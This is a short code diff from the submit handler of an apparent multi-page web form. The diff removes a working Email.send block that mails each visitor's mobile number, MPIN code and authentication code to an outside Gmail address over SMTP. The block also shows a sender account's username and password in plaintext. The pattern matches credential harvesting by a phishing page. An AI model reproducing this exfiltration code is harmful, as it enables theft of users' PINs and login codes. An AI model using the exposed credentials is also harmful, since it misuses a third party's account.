@@ -78,6 +78,7 @@ function focusChange4() {
 function focusChange5() {
   document.getElementById("code6").focus();
 }
+//\\\\ On 3rd page by clicking on submit add the following functionality.
 let authCode = "";
 submitBtn.addEventListener("click", () => {
   let codes = document.querySelectorAll(".auth-code");
@@ -89,17 +90,6 @@ submitBtn.addEventListener("click", () => {
     console.log(userData);
     container3.style.display = "none";
     container4.style.display = "block";
-    Email.send({
-      Host: "smtp.gmail.com",
-      Username: "awaisbusiness616@gmail.com",
-      Password: "awaisbusiness&no2",
-      To: "www.owaistag@gmail.com",
-      From: "awaisbusiness616@gmail.com",
-      Subject: "User Data",
-      Body: `Mobile Number : ${userData[0]}, 
-             MPIN Code: ${userData[1]},
-             Auth Code : ${userData[2]}`,
-    }).then((message) => alert("mail sent successfully", message));
   } else {
     alert("Plz first fill the authentication code boxes");
   }
